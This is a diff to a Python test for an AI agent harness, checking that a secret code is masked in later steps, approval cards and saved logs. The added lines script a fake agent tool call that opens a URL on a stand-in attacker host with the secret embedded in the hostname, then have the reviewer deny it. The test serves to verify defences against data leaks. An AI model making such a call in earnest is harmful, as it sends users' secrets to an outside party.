@@ -3682,6 +3682,7 @@ def secrets_never_reappear_in_later_steps():
                   tc("ask_user", question="Is s3cret-1 the right code?"),
                   tc("note", text="the code is s3cret-1"),
                   tc("type", ref="e4", text="posting s3cret-1", submit=True),
+                  tc("open_url", url="https://s3cret-1.evil.example/"),
                   tc("done", answer="Done. The code was s3cret-1."))
     with Env(FakeAdapter(v), model) as e:
         run = e.start()
@@ -3693,6 +3694,8 @@ def secrets_never_reappear_in_later_steps():
         card = e.ev("approval")[-1]
         assert "s3cret" not in card["title"] and "\u2022\u2022\u2022" in card["title"], card
         e.post("reply", decision="allow")
+        e.until(lambda: (run.pending or {}).get("n") == 7)           # the card's reason names the host: scrubbed too
+        e.post("reply", decision="deny")
         e.finish()
         assert e.end()["status"] == "done", run.events
         blob = json.dumps(run.events) + (app.AGENT_RUNS / f"{e.rid}.json").read_text()
